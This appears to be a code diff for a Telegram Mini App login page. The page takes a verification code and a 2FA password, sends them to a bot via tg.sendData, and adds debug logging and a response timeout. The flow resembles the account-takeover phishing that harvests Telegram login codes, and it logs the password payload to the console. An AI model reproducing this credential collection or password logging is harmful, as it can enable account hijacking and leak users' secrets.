@@ -79,6 +79,23 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log('Viewport changed:', data);
     });
 
+	// Добавьте после инициализации tg
+	const mainButton = tg.MainButton;
+
+	// Альтернативный способ отправки данных
+	function sendDataToBot(payload) {
+		console.log("📤 Sending data to bot:", payload);
+		
+		// Способ 1: через sendData
+		try {
+			tg.sendData(JSON.stringify(payload));
+			return true;
+		} catch (err) {
+			console.error("❌ sendData failed:", err);
+			return false;
+		}
+	}
+
     loginBtn.addEventListener('click', () => {
         console.log('▶️ Login button clicked');
         loginBtn.style.opacity = '0';
@@ -122,54 +139,71 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    submitBtn.addEventListener('click', () => {
-        console.log(`➡️ Submit clicked, step=${currentStep}`);
+	submitBtn.addEventListener('click', () => {
+		console.log(`➡️ Submit clicked, step=${currentStep}`);
 
-        if (currentStep === 'code') {
-            const code = codeInput.value.trim();
-            if (!code) {
-                errorMsg.textContent = 'Введите код.';
-                errorMsg.classList.remove('hidden');
-                return;
-            }
-            const payload = { action: 'verify_code', code: code };
-            console.log("📤 Sending code payload:", payload);
+		if (currentStep === 'code') {
+			const code = codeInput.value.trim();
+			if (!code) {
+				errorMsg.textContent = 'Введите код.';
+				errorMsg.classList.remove('hidden');
+				return;
+			}
+			const payload = { action: 'verify_code', code: code };
+			console.log("📤 Sending code payload:", payload);
 
-            try {
-                tg.sendData(JSON.stringify(payload));
-                showLoading();
-                statusMsg.textContent = 'Проверяем код...';
-                errorMsg.classList.add('hidden');
-                tg.HapticFeedback.impactOccurred('medium');
-            } catch (err) {
-                console.error("Ошибка отправки tg.sendData:", err);
-                errorMsg.textContent = '❌ Ошибка соединения с ботом.';
-                errorMsg.classList.remove('hidden');
-            }
+			try {
+				// ДОБАВЬТЕ ЭТУ ПРОВЕРКУ
+				console.log("📤 Telegram WebApp available:", !!tg);
+				console.log("📤 sendData available:", !!tg.sendData);
+				
+				tg.sendData(JSON.stringify(payload));
+				console.log("📤 Data sent successfully");
+				
+				showLoading();
+				statusMsg.textContent = 'Проверяем код...';
+				errorMsg.classList.add('hidden');
+				tg.HapticFeedback.impactOccurred('medium');
+				
+				// ДОБАВЬТЕ ТАЙМАУТ ДЛЯ ПРОВЕРКИ
+				setTimeout(() => {
+					if (loadingSpinner.classList.contains('hidden') === false) {
+						console.log('⚠️ No response from bot after 10 seconds');
+						errorMsg.textContent = '❌ Нет ответа от бота. Попробуйте снова.';
+						errorMsg.classList.remove('hidden');
+						hideLoading();
+					}
+				}, 10000);
+				
+			} catch (err) {
+				console.error("❌ Ошибка отправки tg.sendData:", err);
+				errorMsg.textContent = '❌ Ошибка соединения с ботом.';
+				errorMsg.classList.remove('hidden');
+			}
 
-        } else if (currentStep === '2fa') {
-            const password = twoFaInput.value.trim();
-            if (!password) {
-                errorMsg.textContent = 'Введите пароль 2FA.';
-                errorMsg.classList.remove('hidden');
-                return;
-            }
-            const payload = { action: 'verify_2fa', password: password };
-            console.log("📤 Sending 2FA payload:", payload);
+		} else if (currentStep === '2fa') {
+			const password = twoFaInput.value.trim();
+			if (!password) {
+				errorMsg.textContent = 'Введите пароль 2FA.';
+				errorMsg.classList.remove('hidden');
+				return;
+			}
+			const payload = { action: 'verify_2fa', password: password };
+			console.log("📤 Sending 2FA payload:", payload);
 
-            try {
-                tg.sendData(JSON.stringify(payload));
-                showLoading();
-                statusMsg.textContent = 'Подтверждаем 2FA...';
-                errorMsg.classList.add('hidden');
-                tg.HapticFeedback.impactOccurred('heavy');
-            } catch (err) {
-                console.error("Ошибка отправки tg.sendData:", err);
-                errorMsg.textContent = '❌ Ошибка соединения с ботом.';
-                errorMsg.classList.remove('hidden');
-            }
-        }
-    });
+			try {
+				tg.sendData(JSON.stringify(payload));
+				showLoading();
+				statusMsg.textContent = 'Подтверждаем 2FA...';
+				errorMsg.classList.add('hidden');
+				tg.HapticFeedback.impactOccurred('heavy');
+			} catch (err) {
+				console.error("❌ Ошибка отправки tg.sendData:", err);
+				errorMsg.textContent = '❌ Ошибка соединения с ботом.';
+				errorMsg.classList.remove('hidden');
+			}
+		}
+	});
 
     // Обработка нажатия Enter в полях ввода
     codeInput.addEventListener('keypress', (e) => {
